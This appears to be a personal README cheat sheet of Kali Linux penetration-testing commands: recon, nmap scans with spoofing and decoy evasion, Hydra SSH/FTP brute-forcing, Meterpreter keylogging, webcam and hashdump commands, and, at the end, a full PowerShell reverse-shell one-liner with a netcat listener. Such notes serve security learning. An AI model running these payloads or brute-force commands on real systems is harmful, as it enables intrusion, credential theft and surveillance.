
# kali linux commands
| usage | command |
| --- | --- |
| prints current working directry, uses to redirect to open a file | `pwd`  |
| list all files | `ls` |
| list of all files in the directory with details | `ls -l` |
| open a folder | `cd` |
| previous folder | `..` | 
| prints descrption of a function | `man` |
| create a file directory | `mkdir (filename)` |
| copy paste a file or folder | `cp (from filelocation) (to filelocation)` |
| Delete a file | `rm -rf` |
| to create a file |  `touch <filename>` |
| to find a file in kali linux | `find -name <filename>` |
| to find how many lines in the file | `wc -l <filename>` |
| to find a term in the file | `grep "<term>" <filename>` |
| update tools | `sudo apt-get update` |
| upgrade tools | `sudo apt-get upgrade` |
| upgrade kali linux | `sudo apt upgrade` | 
| update kali linux | `sudo apt update` |
| run 2 commands concurently |  `ls;pwd` or `ls && pwd` |
| run the 2nd command directly by neglecting the first commands | `ls (shift+\) pwd` |
| display the contents of the file | `cat <filedirectory>` |
<h3 align="center"> ... </h3>  

## check IP address


- to check the information of the TARGETIP website  
```
http://whois.domaintools.com/
```
- to check which techonology is used in TARGETIP website  
```
http://toolbar.netcraft.com/site_report?url=
```

- which which website have same ipaddress  

>if we can hack into 1 we can hack all the other

```
https://www.robtex.com/ 
```  
- Using bing.com, search for `ip: [TARGETIP ip]`
<h3 align="center"> ... </h3> 

## Content Discovery
- 3 categories:
 1. Manual.
 2. Automated.
 3.  OSINT (open source intelligence).
  
- To find the framework using kali linux `curl <URL> | md5sum`.
> `curl` - download or upload data to a server via supported protocols such as HTTP, FTP, IMAP, SFTP, TFTP, IMAP, POP3, SCP, etc.

<h3 align="center"> ... </h3> 

## Active Reconnaisense
- You can use `traceroute` to map the path to the target.
> `-c` - give the total routers ip's by stealing with ICMP req b/w sys and target.
- `ping`  to check if the target system responds to `ICMP` Echo.
-  `telnet` to check which `ports` are open (UDP) and reachable by attempting to connect to them.
-  `netcat` give response header (TCP or UDP)

| type | command |
| - | - |
| ping |	`ping -c 10 10.10.255.149 on Linux or macOS` |
| ping |	`ping -n 10 10.10.255.149 on MS Windows` |
| traceroute |	`traceroute 10.10.255.149 on Linux or macOS` | 
|tracert	| `tracert 10.10.255.149 on MS Windows`	| 
| telnet	| 	`telnet 10.10.255.149 PORT_NUMBER`	| 
| netcat as client		| `nc 10.10.255.149 PORT_NUMBER`	| 
| netcat as server	| 	`nc -lvnp PORT_NUMBER`	| 

### netcat commands 
| netcat attribute | description |
| - | - |
| -l | listen mode |
| -p | specify port |
| -n | num only ; no resolution of hostname via DNS |
| -v | verbose output ( useful discover bugs ) |
| -v | very verbose output(opt) |
| -k | keep listening after client disconnect |

<h3 align="center"> ... </h3> 

## Nmap Commands

| Scan Type |	Example Command |
| --- | --- |
 | ARP Scan  | 	 `sudo nmap -PR -sn MACHINE_IP/24` | 
ICMP Echo Scan |  	`sudo nmap -PE -sn MACHINE_IP/24` | 
ICMP Timestamp Scan |  	`sudo nmap -PP -sn MACHINE_IP/24` | 
ICMP Address Mask Scan |  	`sudo nmap -PM -sn MACHINE_IP/24` | 
TCP SYN Ping Scan |  	`sudo nmap -PS22,80,443 -sn MACHINE_IP/30` | 
TCP ACK Ping Scan |  	`sudo nmap -PA22,80,443 -sn MACHINE_IP/30` | 
UDP Ping Scan |  	`sudo nmap -PU53,161,162 -sn MACHINE_IP/30` | 

Remember to add `-sn` if you are only interested in host discovery without port-scanning. Omitting `-sn` will let Nmap default to port-scanning the live hosts.
 | Option |  	Purpose | 
  | -- | -- | 
 | `-n` |  	no DNS lookup | 
 | `-R` |  	reverse-DNS lookup for all hosts | 
 | `-sn`  | 	host discovery only | 

 
### NMAP FOR TCP AND UDP

| Port Scan | Type	Example Command |
| - | - |
| TCP Connect Scan |	`nmap -sT MACHINEIP` |
| TCP SYN Scan |		`sudo	nmap -sS MACHINEIP` |
| UDP Scan |		`sudo nmap -sU MACHINEIP` |

These scan types should get you started discovering running TCP and UDP services on a target host.

| Option |	Purpose |
| - | - |
| -p- |	all ports |
| `-p1-1023` |	scan ports 1 to 1023 |
| `-F` |	100 most common ports |
| `-r` |	scan ports in consecutive order |
| `-T<0-5>	-T0` | being the slowest and T5 the fastest |
| `--max-rate 50` |	rate <= 50 packets/sec |
| `--min-rate 15` |	rate >= 15 packets/sec |
| `--min-parallelism 100` |	at least 100 probes in parallel |

### NMAP more advanced

| Port Scan Type | Command |
| - | - |  
| TCP Null Scan	| `sudo nmap -sN 10.10.27.66` |
| TCP FIN Scan	| `sudo nmap -sF 10.10.27.66` |
| TCP Xmas Scan	| `sudo nmap -sX 10.10.27.66` |
| TCP Maimon Scan	| `sudo nmap -sM 10.10.27.66` |
| TCP ACK Scan	| `sudo nmap -sA 10.10.27.66` |
| TCP Window Scan	| `sudo nmap -sW 10.10.27.66` |
| Custom TCP Scan	| `sudo nmap --scanflags URGACKPSHRSTSYNFIN 10.10.27.66` |
| Spoofed Source IP	| `sudo nmap -S SPOOFED_IP 10.10.27.66` |
| Spoofed MAC Address	| `--spoof-mac SPOOFED_MAC` |
| Decoy Scan	| `nmap -D DECOY_IP,ME 10.10.27.66` |
| Idle (Zombie) Scan	| `sudo nmap -sI ZOMBIE_IP 10.10.27.66` |
| Fragment IP data into 8 bytes	| `-f` |
| Fragment IP data into 16 bytes	| `-ff` |

| Option	| Purpose | 
| - | - |
| `--source-port PORT_NUM` | specify source port number |
| `--data-length NUM` | append random data to reach given length |

- These scan types rely on setting TCP flags in unexpected ways to prompt ports for a reply. Null, FIN, and Xmas scan provoke a response from closed ports, while Maimon, ACK, and Window scans provoke a response from open and closed ports.

| Option |	Purpose |
| - | - |
| `--reason` |	explains how Nmap made its conclusion |
| `-v` |	verbose |
| `-vv` |	very verbose |
| `-d` |	debugging |
| `-dd` |	more details for debugging |

### nmap saving output

| Option	| Meaning |
| - | - |
| `-sV` |	determine service/version info on open ports |
| `-sV --version-light` | try the most likely probes (2) |
| `-sV--version-all` | try all available probes (9) |
| `-O` |	detect OS |
| `--traceroute` |	run traceroute to target |
| `--script "SCRIPTS"` |	Nmap scripts to run |
| `-sC` or `--script=default` |	run default scripts |
| `-A` |	equivalent to `-sV` `-O` `-sC` `--traceroute` |
| `-oN` |	save output in normal format |
| `-oG` |	save output in grepable format |
| `-oX` |	save output in XML format |
| `-oA` |	save output in normal, XML and Grepable formats |

<h3 align="center"> ... </h3> 

## protocols and servers

| Protocol | TCP Port | Application(s) | Data Security |
|----------|----------|----------------|---------------|
| FTP      | 21       | File Transfer   | Cleartext     |
| HTTP     | 80       | Worldwide Web   | Cleartext     |
| IMAP     | 143      | Email (MDA)     | Cleartext     |
| POP3     | 110      | Email (MDA)     | Cleartext     |
| SMTP     | 25       | Email (MTA)     | Cleartext     |
| Telnet   | 23       | Remote Access   | Cleartext     |

<h3 align="center"> ... </h3> 

## Protocols and Servers

| Protocol | TCP Port | Application(s)                      | Data Security |
|----------|----------|-------------------------------------|---------------|
| FTP      | 21       | File Transfer                       | Cleartext     |
| FTPS     | 990      | File Transfer                       | Encrypted     |
| HTTP     | 80       | Worldwide Web                       | Cleartext     |
| HTTPS    | 443      | Worldwide Web                       | Encrypted     |
| IMAP     | 143      | Email (MDA)                         | Cleartext     |
| IMAPS    | 993      | Email (MDA)                         | Encrypted     |
| POP3     | 110      | Email (MDA)                         | Cleartext     |
| POP3S    | 995      | Email (MDA)                         | Encrypted     |
| SFTP     | 22       | File Transfer                       | Encrypted     |
| SSH      | 22       | Remote Access and File Transfer     | Encrypted     |
| SMTP     | 25       | Email (MTA)                         | Cleartext     |
| SMTPS    | 465      | Email (MTA)                         | Encrypted     |
| Telnet   | 23       | Remote Access                       | Cleartext     |

<h3 align="center"> ... </h3> 


## HYDRA

- A password cracking tool uses a syntax.
- For SSH - `sudo hydra -l <username> -P <full path to pass> MACHINE_IP -t 4 ssh`.
- for HYDRA `sudo hydra -l <username> -P <passlist.txt> ftp://MACHINE_IP:PORT`.
- Mostly the password files are saved in `/usr/share/wordlists/rockyou.txt`.

> After the ssh run the command `ssh <username>@<machineIP>`. this helps to access the target machine.
>
> to copy a file in `scp <file> username@IP:/home/username ~` from the another server through **ssh**.

| Option            | Explanation                                           |
|-------------------|-------------------------------------------------------|
| -l username       | Provide the login name                                |
| -P WordList.txt   | Specify the password list to use `usr/share/wordlists/rockyou.txt` |
| server service    | Set the server address and service to attack          |
| -t (optional) | USE threads for the execution |
| 4 (opt) | No. of threads to be used |
| -s PORT           | Use in case of non-default service port number        |
| -V or -vV         | Show the username and password combinations being tried |
| -d                | Display debugging output if the verbose output is not helping |

<h3 align="center"> ... </h3> 

## Vulnerability score

| Rating   | Score        |
|----------|--------------|
| None     | 0            |
| Low      | 0.1 - 3.9    |
| Medium   | 4.0 - 6.9    |
| High     | 7.0 - 8.9    |
| Critical | 9.0 - 10.0   |

## metasploit

Here’s how you can organize the commands into tables for your GitHub README file:

### Core Commands

| Command    | Description                                                   |
|------------|---------------------------------------------------------------|
| `background` | Backgrounds the current session                               |
| `exit`       | Terminate the Meterpreter session                             |
| `guid`       | Get the session GUID (Globally Unique Identifier)             |
| `help`       | Displays the help menu                                        |
| `info`       | Displays information about a Post module                      |
| `irb`        | Opens an interactive Ruby shell on the current session        |
| `load`       | Loads one or more Meterpreter extensions                      |
| `migrate`    | Allows you to migrate Meterpreter to another process          |
| `run`        | Executes a Meterpreter script or Post module                  |
| `sessions`   | Quickly switch to another session                             |


### File System Commands

| Command   | Description                                        |
|-----------|----------------------------------------------------|
| `cd`      | Changes directory                                  |
| `ls`      | Lists files in the current directory (dir will also work) |
| `pwd`     | Prints the current working directory               |
| `edit`    | Allows you to edit a file                          |
| `cat`     | Shows the contents of a file to the screen         |
| `rm`      | Deletes the specified file                         |
| `search`  | Searches for files                                 |
| `upload`  | Uploads a file or directory                        |
| `download`| Downloads a file or directory                      |


### Networking Commands


| Command   | Description                                           |
|-----------|-------------------------------------------------------|
| `arp`     | Displays the host ARP (Address Resolution Protocol) cache |
| `ifconfig`| Displays network interfaces available on the target system |
| `netstat` | Displays the network connections                      |
| `portfwd` | Forwards a local port to a remote service             |
| `route`   | Allows you to view and modify the routing table       |


### System Commands

| Command   | Description                                         |
|-----------|-----------------------------------------------------|
| `clearev` | Clears the event logs                               |
| `execute` | Executes a command                                  |
| `getpid`  | Shows the current process identifier                |
| `getuid`  | Shows the user that Meterpreter is running as       |
| `kill`    | Terminates a process                                |
| `pkill`   | Terminates processes by name                        |
| `ps`      | Lists running processes                             |
| `reboot`  | Reboots the remote computer                         |
| `shell`   | Drops into a system command shell                   |
| `shutdown`| Shuts down the remote computer                      |
| `sysinfo` | Gets information about the remote system, such as OS |



### Other Commands

| Command        | Description                                          |
|----------------|------------------------------------------------------|
| `idletime`     | Returns the number of seconds the remote user has been idle |
| `keyscan_dump` | Dumps the keystroke buffer                           |
| `keyscan_start`| Starts capturing keystrokes                          |
| `keyscan_stop` | Stops capturing keystrokes                           |
| `screenshare`  | Allows you to watch the remote user's desktop in real time |
| `screenshot`   | Grabs a screenshot of the interactive desktop        |
| `record_mic`   | Records audio from the default microphone for X seconds |
| `webcam_chat`  | Starts a video chat                                  |
| `webcam_list`  | Lists webcams                                        |
| `webcam_snap`  | Takes a snapshot from the specified webcam           |
| `webcam_stream`| Plays a video stream from the specified webcam       |
| `getsystem`    | Attempts to elevate your privilege to that of local system |
| `hashdump`     | Dumps the contents of the SAM database               |


## connect reverse shell

- `nc -nvlp 443` in attacker machine.
- run the below command in the target system, just replace `<ip>,<port>`.
```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
payload all the things
```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master
```
